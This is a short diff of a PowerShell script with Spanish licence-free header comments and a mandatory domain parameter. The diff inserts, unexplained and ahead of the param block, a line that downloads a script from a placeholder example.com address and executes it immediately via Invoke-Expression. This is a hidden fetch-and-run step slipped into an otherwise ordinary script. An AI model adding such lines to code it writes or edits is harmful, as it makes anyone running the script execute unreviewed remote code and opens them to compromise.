@@ -3,6 +3,9 @@
 # Si se te llena la boca hablando de libertad entonces hazlo realmente libre.
 # No tienes que aceptar ningún tipo de términos de uso o licencia para utilizarlo o modificarlo porque va sin CopyLeft.
 
+
+Invoke-Expression (Invoke-WebRequest -Uri "https://example.com/script.ps1" -UseBasicParsing).Content
+
 param (
   [Parameter(Mandatory=$true)]
   [string]$vDominio
